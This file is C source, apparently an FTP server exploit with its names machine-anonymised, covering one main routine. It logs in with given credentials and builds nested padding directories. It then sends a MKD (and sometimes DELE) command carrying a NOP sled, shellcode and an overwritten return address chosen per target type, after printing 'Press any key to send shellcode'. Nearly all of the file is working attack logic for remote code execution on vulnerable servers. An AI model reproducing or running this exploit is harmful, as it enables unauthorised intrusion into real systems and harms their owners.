
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct in_addr {int dummy; } ;
typedef int inbuf ;
struct TYPE_4__ {char* username; char* password; char* start_dir; int chroot; int offset; int t; char* shellcode; } ;
struct TYPE_3__ {int align; int ret_address; int overflow_type; scalar_t__ pad_shift; } ;
typedef int FILE ;


 int FUNC_0 (char*,int,int *) ;
 int VAR_0 ;
 int FUNC_1 (int) ;
 void* FUNC_2 (char*) ;
 int FUNC_3 (int,char*) ;
 int FUNC_4 (int) ;
 int FUNC_5 (char*) ;
 int * FUNC_6 (int,char*) ;
 scalar_t__ FUNC_7 (char*,int,int *,char*,...) ;
 int FUNC_8 () ;
 int FUNC_9 (int,char**,char*) ;
 char* VAR_1 ;
 char* VAR_2 ;
 int FUNC_10 (char*,int,int) ;
 char* VAR_3 ;
 scalar_t__ VAR_4 ;
 TYPE_2__ VAR_5 ;
 scalar_t__ FUNC_11 (char*,int*) ;
 int FUNC_12 (char*) ;
 int FUNC_13 (char*,...) ;
 int FUNC_14 () ;
 int FUNC_15 (char*,struct in_addr*) ;
 int FUNC_16 (int ) ;
 int FUNC_17 (char*,char*) ;
 char* FUNC_18 (char*) ;
 int FUNC_19 (char*) ;
 int FUNC_20 (struct in_addr,int) ;
 int FUNC_21 (int *) ;
 TYPE_1__* VAR_6 ;
 int FUNC_22 (char*) ;

int FUNC_23(int VAR_7,char **VAR_8)
{
        char *VAR_9,VAR_10;
        char VAR_11[1024], VAR_12[1024], VAR_13[5];
        int VAR_14,VAR_15,VAR_16;
        FILE *VAR_17;
        int VAR_18;
        struct in_addr VAR_19;

        VAR_9 = FUNC_18(VAR_8[0]);
        *VAR_5.username = *VAR_5.password = *VAR_5.start_dir = 0;
        VAR_5.chroot = VAR_5.offset = VAR_5.t = 0;
        VAR_5.shellcode = VAR_1;

        while ((VAR_16 = FUNC_9(VAR_7,VAR_8,"cs:o:t:"))!= -1){
                switch (VAR_16) {
                case 'c':
                        VAR_5.shellcode = VAR_2;
                        VAR_5.chroot = 1;
                        break;
                case 's':
                        FUNC_17(VAR_5.start_dir,VAR_3);
                        break;
                case 'o':
                        VAR_5.offset = FUNC_2(VAR_3);
                        break;
                case 't':
                        VAR_5.t = FUNC_2(VAR_3);
                        if ((VAR_5.t < 0)||(VAR_5.t>5)) {
                                FUNC_13("Dont have that type!\n");
                                FUNC_4(-1);
                        }
                }
        }

        VAR_7 -= VAR_4;
        VAR_8 += VAR_4;

        if (VAR_7 < 3)
                FUNC_22(VAR_9);

        if (!FUNC_15(VAR_8[0],&VAR_19)) {
                FUNC_12("resolving");
                FUNC_4(-1);
        }
        FUNC_17(VAR_5.username,VAR_8[1]);
        FUNC_17(VAR_5.password,VAR_8[2]);

        if ((VAR_18 = FUNC_20(VAR_19,21)) < 0) {
                FUNC_12("connect");
                FUNC_4(-1);
        }

        if (!(VAR_17 = FUNC_6(VAR_18,"r"))) {
                FUNC_13("Couldn't get stream\n");
                FUNC_4(-1);
        }

        FUNC_0(VAR_12,sizeof(VAR_12),VAR_17);
        FUNC_13("%s",VAR_12);

        if (FUNC_7(VAR_12,331,VAR_17,"USER %s\n",VAR_5.username)<0)
                FUNC_5("Bad username\n");
        if (FUNC_7(VAR_12,230,VAR_17,"PASS %s\n",VAR_5.password)<0)
                FUNC_5("Bad password\n");

        if (*VAR_5.start_dir)
                if (FUNC_7(VAR_12,250,VAR_17,"CWD %s\n",VAR_5.start_dir)<0)
                        FUNC_5("Couldn't change dir\n");

        if (FUNC_7(VAR_12,257,VAR_17,"PWD\n")<0)
                FUNC_5("PWD\n");

        if (FUNC_11(VAR_12,&VAR_14) < 0)
                FUNC_5("PWD\n");

        FUNC_16(FUNC_21(((void*)0)));
        FUNC_13("Making padding directorys\n");
        for (VAR_15 = 0;VAR_15 < 4;VAR_15++) {
                VAR_10 = FUNC_14()%26 + 65;
                FUNC_10(VAR_11,VAR_10,194);
                VAR_11[194]=0;
                if (FUNC_7(VAR_12,257,VAR_17,"MKD %s\n",VAR_11)<0)
                        FUNC_5("MKD\n");
                if (FUNC_7(VAR_12,250,VAR_17,"CWD %s\n",VAR_11)<0)
                        FUNC_5("CWD\n");
        }



        VAR_15 = 124 - (VAR_14 - VAR_6[VAR_5.t].align);

        VAR_15 -= VAR_6[VAR_5.t].pad_shift;
        if (VAR_15 < 0) {
                FUNC_4(-1);
        }
        FUNC_10(VAR_11,'A',VAR_15+1);
        VAR_11[VAR_15] = 0;
        if (FUNC_7(VAR_12,257,VAR_17,"MKD %s\n",VAR_11)<0)
                FUNC_5("MKD\n");
        if (FUNC_7(VAR_12,250,VAR_17,"CWD %s\n",VAR_11)<0)
                FUNC_5("CWD\n");

        FUNC_10(VAR_11,0x90,195);
        VAR_16=0;
        for (VAR_15 = VAR_0-FUNC_19(VAR_5.shellcode);VAR_15<(VAR_0);VAR_15++)
                VAR_11[VAR_15] = VAR_5.shellcode[VAR_16++];
        FUNC_3(VAR_6[VAR_5.t].ret_address-VAR_5.offset,VAR_13);
        FUNC_17(VAR_11+VAR_0,VAR_13);
        FUNC_17(VAR_11+VAR_0+FUNC_19(VAR_13),VAR_13);

        FUNC_13("Press any key to send shellcode...\n");
        FUNC_8();
        if (FUNC_7(VAR_12,257,VAR_17,"MKD %s\n",VAR_11)<0)
                FUNC_5("MKD\n");
        if (VAR_6[VAR_5.t].overflow_type == 1)
                if (FUNC_7(VAR_12,250,VAR_17,"DELE %s\n",VAR_11)<0)
                        FUNC_5("DELE\n");




        FUNC_1(VAR_18);
        return(1);
}
